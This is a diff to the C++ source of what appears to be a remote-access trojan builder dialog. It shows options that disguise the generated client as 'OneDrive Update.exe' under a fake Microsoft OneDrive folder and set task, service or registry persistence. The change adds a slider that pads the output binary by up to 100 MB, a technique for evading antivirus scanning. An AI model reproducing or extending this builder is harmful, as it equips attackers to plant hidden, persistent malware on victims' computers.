@@ -119,10 +119,18 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
 
         CheckDlgButton(hDlg, IDC_CHECK_ENCRYPT_IP, BST_CHECKED);
 
+        // 设置增肥 Slider 范围
+        HWND hSlider = GetDlgItem(hDlg, IDC_SLIDER_CLIENT_SIZE);
+        if (hSlider) {
+            SendMessageW(hSlider, TBM_SETRANGE, TRUE, MAKELONG(0, 100)); // 0-100 MB
+            SendMessageW(hSlider, TBM_SETPOS, TRUE, 0);
+        }
+
         // 设置安装目录和程序名称默认值
         SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_DIR, L"%ProgramData%\\Microsoft OneDrive");
         SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_NAME, L"OneDrive Update.exe");
         
+        ApplyModernTheme(hDlg);
         return (INT_PTR)TRUE;
     }
     case WM_COMMAND:
@@ -181,6 +189,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
             bool buildBoth = (bitsIndex == 2);
             bool is64Bit = (bitsIndex == 1);
             bool encryptIp = (IsDlgButtonChecked(hDlg, IDC_CHECK_ENCRYPT_IP) == BST_CHECKED);
+            int pumpSize = (int)SendMessageW(GetDlgItem(hDlg, IDC_SLIDER_CLIENT_SIZE), TBM_GETPOS, 0, 0);
 
             // 如果选择了 Both，则忽略 is64Bit 手动选择的结果，直接循环两次
             if (buildBoth) {
@@ -318,6 +327,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         pAddr->taskStartup = (char)(taskStartup ? 1 : 0);
                         pAddr->serviceStartup = (char)(serviceStartup ? 1 : 0);
                         pAddr->registryStartup = (char)(registryStartup ? 1 : 0);
+                        pAddr->iPumpSize = pumpSize;
                         pAddr->runningType = (char)runTypeIndex;
                         pAddr->protoType = (char)protocolIndex;
                         pAddr->payloadType = (char)payloadIndex;
@@ -388,21 +398,36 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                                 CloseHandle(pi.hProcess);
                                 CloseHandle(pi.hThread);
                                 DeleteFileW(szTempFile);
-                                return true;
+                                goto PUMP_SECTION; // 跳转到增肥环节
                             }
                         }
                         DeleteFileW(szTempFile);
                     }
                 }
 
-                HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                if (hFile != INVALID_HANDLE_VALUE) {
+                {
+                    HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                    if (hFile == INVALID_HANDLE_VALUE) return false;
+                    
                     DWORD written;
                     WriteFile(hFile, buffer.data(), (DWORD)buffer.size(), &written, NULL);
                     CloseHandle(hFile);
-                    return true;
                 }
-                return false;
+
+PUMP_SECTION:
+                // 如果需要程序增肥
+                if (pumpSize > 0) {
+                    HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+                    if (hFile != INVALID_HANDLE_VALUE) {
+                        LARGE_INTEGER liSize;
+                        liSize.QuadPart = (LONGLONG)pumpSize * 1024 * 1024;
+                        SetFilePointerEx(hFile, liSize, NULL, FILE_END);
+                        SetEndOfFile(hFile);
+                        CloseHandle(hFile);
+                    }
+                }
+
+                return true;
             };
 
             bool success = false;
